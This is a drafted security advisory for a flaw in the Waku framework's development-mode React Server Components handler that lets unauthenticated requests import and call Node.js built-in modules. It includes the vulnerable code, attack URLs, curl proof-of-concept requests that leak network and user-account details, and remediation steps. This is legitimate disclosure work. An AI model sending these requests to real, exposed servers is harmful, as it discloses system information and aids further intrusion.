 **Title:**
     ```
     Development Mode RSC Handler Allows Arbitrary Node.js Module Import
     ```

     **Severity:** High

     **CVSS Score:** 7.5

     **CVSS Vector:**
     ```
     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     ```

     **CWE IDs:** CWE-94, CWE-200

     **Affected Product:** waku

     **Ecosystem:** npm

     **Affected Versions:** <= 0.21.0

     **Patched Versions:** *(leave blank)*

     ---

     ## DESCRIPTION (copy everything below this line)

     ### Summary

     A vulnerability in Waku's development mode RSC (React Server
     Components) handler allows unauthenticated attackers to import and
     invoke arbitrary Node.js built-in modules. This leads to complete
     system information disclosure.

     ### Vulnerable Code

     **File:** `waku/dist/lib/middleware/handler.js`

     The RSC handler decodes function IDs from URL paths and passes them
     directly to Vite's `ssrLoadModule()` without validation:

     ```javascript
     const funcId = decodeFuncId(rscPath);
     if (funcId) {
         const [fileId, name] = funcId.split('#');
         const mod = await loadServerModule(fileId);  // NO VALIDATION
         return { type: 'function', fn: mod[name], ... };
     }
     ```

     In dev mode, `loadServerModule` calls `vite.ssrLoadModule()` with the
     user-controlled path.

     ### Attack Vector

     **Endpoint:** `/RSC/F/{module}/{export}.txt`

     Attacker sends requests like:
     - `/RSC/F/node:os/networkInterfaces.txt` - Leaks network topology
     - `/RSC/F/node:os/userInfo.txt` - Leaks user account info
     - `/RSC/F/node:process/cwd.txt` - Leaks filesystem paths

     ### Impact

     **Confirmed:**
     - Full network topology (IPs, MACs, VPN interfaces)
     - User account details (UID, username, home directory, shell)
     - Hardware information (CPU model, core count)
     - Filesystem paths

     **Potential:**
     - RCE if suitable gadget chain is found
     - DoS via process manipulation

     ### Proof of Concept

     ```bash
     # Network disclosure
     curl -s 'http://localhost:3005/RSC/F/node:os/networkInterfaces.txt' -X
     POST

     # User info disclosure
     curl -s 'http://localhost:3005/RSC/F/node:os/userInfo.txt' -X POST
     ```

     ### Remediation

     1. **Validate paths:** Block `node:*` protocol, require paths within
     project directory
     2. **Use manifest:** Register valid server functions at startup
     3. **User mitigation:** Do not expose dev servers to untrusted networks

     ### Credit

     Michael Groberman
